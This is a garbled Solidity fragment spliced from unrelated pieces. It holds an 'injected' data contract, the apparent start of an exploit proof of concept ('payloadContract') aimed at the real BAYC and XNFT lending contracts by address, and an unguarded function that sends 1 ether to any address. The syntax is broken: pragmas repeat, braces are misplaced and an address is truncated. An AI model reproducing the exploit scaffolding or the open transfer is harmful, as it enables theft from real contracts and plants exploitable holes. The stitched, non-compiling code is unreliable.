
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

/* Vulnerability 0x97c1edd3 */;

;
;
interface IBAYC {
  function setApprovalForAll(address operator, bool _approved) external;
  function transferFrom(address from,
    address to,
    uint256 tokenId) external;
  function ownerOf(uint256 tokenId) external view returns (address owner)};
interface IXNFT {
  function counter() external returns (uint256);
  function pledgeAndBorrow(address _collection,
    uint256 _tokenId,
    uint256 _nftType,
    address xToken,
    uint256 borrowAmount) external;
  function withdrawNFT(uint256 orderId) external};
interface IXToken {
  function borrow(uint256 orderId,
    address payable borrower,
    uint256 borrowAmount) external};
interface INothing {
  function borrow(uint256 orderId,
    address payable borrower,
    uint256 borrowAmount) external};
contract payloadContract is DSTest {
  event OwnershipTransferred(address indexed previousOwner,
    address indexed newOwner);
  uint256 orderId = 0;
  IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
  IXNFT XNFT = IXNFT(0xb14B3b9682990ccC16F52eB04146C3ceAB01169A);
  IXToken XToken = IXToken(0xB38707E31C813f832ef71c70731ed80B45b85b2d);
  INothing doNothing = INothing(0xA04EC2366641a2286782D10
function replayableTransfer1(address to) public {
    payable(to).transfer(1 ether)}